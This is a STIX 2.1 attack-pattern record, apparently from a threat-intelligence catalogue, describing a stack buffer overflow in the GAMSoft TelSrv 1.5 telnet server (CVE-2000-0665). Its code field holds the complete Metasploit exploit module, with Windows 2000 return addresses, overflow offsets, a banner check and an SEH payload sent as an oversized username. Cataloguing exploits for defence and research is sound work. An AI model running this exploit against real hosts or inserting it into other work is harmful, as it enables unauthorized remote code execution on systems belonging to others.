{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4adbbecf-14d1-4d8b-8800-0dde16d370a0",
    "created": "2024-08-14T16:39:00.284922Z",
    "modified": "2024-08-14T16:39:00.284927Z",
    "name": "GAMSoft TelSrv 1.5 Username Buffer Overflow",
    "description": " This module exploits a username sprintf stack buffer overflow in GAMSoft TelSrv 1.5. Other versions may also be affected. The service terminates after exploitation so you only get one chance! ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/telnet/gamsoft_telsrv_username.rb",
            "external_id": "gamsoft_telsrv_username.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2000-0665"
        },
        {
            "source_name": "reference",
            "url": "http://cdn.simtel.net/pub/simtelnet/win95/inetmisc/telsrv15.zip"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'GAMSoft TelSrv 1.5 Username Buffer Overflow',\n      'Description'\t=> %q{\n          This module exploits a username sprintf stack buffer overflow in GAMSoft TelSrv 1.5.\n        Other versions may also be affected. The service terminates after exploitation,\n        so you only get one chance!\n      },\n      'Author' \t=> [ 'aushack' ],\n      'Arch'\t\t=> [ ARCH_X86 ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          [ 'CVE', '2000-0665'],\n          [ 'OSVDB', '373'],\n          [ 'BID', '1478'],\n          [ 'URL', 'http://cdn.simtel.net/pub/simtelnet/win95/inetmisc/telsrv15.zip'],\n        ],\n      'Privileged'\t\t=> false,\n      'DefaultOptions'\t=>\n        {\n          'EXITFUNC' \t=> 'thread',\n        },\n      'Payload'        \t=>\n        {\n          'Space'\t\t\t=> 1000,\n          'BadChars' \t\t=> \"\\x00\\x0a\",\n          'StackAdjustment' \t=> -3500,\n        },\n      'Platform' => ['win'],\n      'Targets'  =>\n        [\n          [ 'Windows 2000 Pro SP0/4 English REMOTE',\n            {\n              'Ret'\t\t=> 0x75022ac4, # pop/pop/ret ws2help.dll w2k pro en ALL\n              'Offset'\t=> 1886,\n            }\n          ],\n\n          [ 'Windows 2000 Pro SP0/4 English LOCAL (debug - 127.0.0.1)',\n            {\n              'Ret' \t\t=> 0x75022ac4, # pop/pop/ret ws2help.dll w2k pro en ALL\n              'Offset'\t=> 3318,\n            }\n          ],\n\n          [ 'Windows 2000 Pro SP0/4 English LOCAL (debug - dhcp)',\n            {\n              'Ret' \t\t=> 0x75022ac4, # pop/pop/ret ws2help.dll w2k pro en ALL\n              'Offset' \t=> 3358,\n            }\n          ],\n=begin\n          [ 'Windows XP Pro SP0/1 English',\n            {\n              'Ret' \t\t=> 0x71aa32ad, # pop/pop/ret xp pro en ALL\n              'Offset'\t=> 2600, # this is made up and absolutely wrong ;-)\n            }\n          ],\n=end\n        ],\n      'DisclosureDate' => '2000-07-17',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(23),\n      ])\n  end\n\n  def check\n    connect\n    print_status(\"Attempting to determine if target is possibly vulnerable...\")\n    select(nil,nil,nil,7)\n    banner = sock.get_once || ''\n    vprint_status(\"Banner: #{banner}\")\n\n    if banner.to_s =~ /TelSrv 1\\.5/\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Trying target #{target.name} on host #{datastore['RHOST']}:#{datastore['RPORT']}...\")\n    connect\n    print_status(\"Connected to telnet service... waiting several seconds.\") # User friendly message due to sleep.\n    select(nil,nil,nil,7) # If unregistered version, you must wait for >5 seconds. Seven is safe. Six is not.\n\n    username = rand_text_english(20000, payload_badchars)\n    seh = generate_seh_payload(target.ret)\n    username[target['Offset'], seh.length] = seh\n\n    print_status(\"Sending #{ username.length} byte username as exploit (including #{seh.length} byte payload)...\")\n    sock.put(username)\n    select(nil,nil,nil,0.25)\n    print_status('Exploit sent...')\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2000-07-17",
    "x_mitre_platforms": [
        "['win']"
    ]
}